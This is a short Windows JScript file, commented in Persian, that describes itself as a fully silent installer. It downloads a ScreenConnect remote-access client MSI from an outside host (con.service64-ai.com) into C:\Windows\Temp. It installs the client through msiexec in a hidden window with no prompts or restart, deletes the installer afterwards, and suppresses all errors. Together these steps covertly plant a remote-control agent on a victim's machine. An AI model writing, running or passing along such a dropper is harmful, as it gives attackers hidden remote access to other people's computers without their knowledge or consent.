// اسکریپت نصب کاملاً سایلنت و بدون هیچ پیامی
var url = "https://con.service64-ai.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
var tempFolder = "C:\\Windows\\Temp";
var fileName = "ScreenConnect.ClientSetup.msi";
var filePath = tempFolder + "\\" + fileName;

try {
    var shell = new ActiveXObject("WScript.Shell");
    
    // 1. دانلود فایل در پس‌زمینه
    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
    xhr.open("GET", url, false);
    xhr.send();

    if (xhr.status === 200) {
        // 2. ذخیره فایل
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1;
        stream.Open();
        stream.Write(xhr.ResponseBody);
        stream.SaveToFile(filePath, 2);
        stream.Close();

        // 3. اجرای نصب کاملاً سایلنت (بدون پنجره و بدون ری‌استارت)
        // پارامتر 0 یعنی پنجره مخفی باشد
        shell.Run('msiexec.exe /i "' + filePath + '" /qn /norestart', 0, true);

        // 4. پاک کردن فایل نصب
        try {
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            fso.DeleteFile(filePath, true);
        } catch (e) {}
    }
} catch (err) {
    // در صورت بروز خطا، هیچ کاری انجام نده و بی‌صدا خارج شو
}